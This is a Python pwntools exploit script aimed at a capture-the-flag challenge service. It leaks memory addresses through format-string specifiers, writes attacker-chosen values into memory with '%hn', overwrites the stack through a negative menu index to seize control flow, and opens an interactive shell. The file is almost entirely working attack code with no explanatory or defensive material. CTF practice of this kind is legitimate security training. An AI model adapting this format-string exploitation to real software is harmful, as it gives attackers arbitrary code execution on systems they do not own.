#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './challenge'
elf = ELF(binary)
libc = elf.libc

# io = process(binary, aslr = 0)
io = remote('svc.pwnable.xyz', 30010)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

def menu(idx):
    io.recvuntil('> ')
    io.sendline(str(idx))

# leak bss addr
length = (0x1f - 6)
name = 'a' * length + '%2$pAA'
io.recvuntil("Name: ")
io.send(name)
menu(2)
name = int(io.recvuntil('A')[:-1], 16) - 0x30
print(hex(name))

# leak stack addr
menu(1)
io.recvuntil("Name: ")
io.send('a' * length + '%10$pA')
menu(2)
stack = int(io.recvuntil('A')[:-1], 16)

# overwrite data with number on the stack
menu(1)
io.recvuntil("Name: ")
io.send('a' * length + 'A%6$hn')
writeable_addr = (name + 0x100) & 0xffffff00
menu(str(writeable_addr | 2))

# over write the null byte with fmt string attack
for i in range(10):
    menu(name + 0x26 + i)

# overwrite stack
choice = (writeable_addr | 1)
menu(choice)
io.recvuntil("Name: ")
print(hex(stack))
value = 0xffff & (name - 0x2040 + 0x09fd - 0x19) # minus the previous printed chars
print(hex(value))
io.sendline('%' + str(value) + 'd' + '%6$hn')


menu('-' + str(0x100000000 - (stack - 0xc))) # overwrite the stack

# exit to control the EIP

io.interactive()
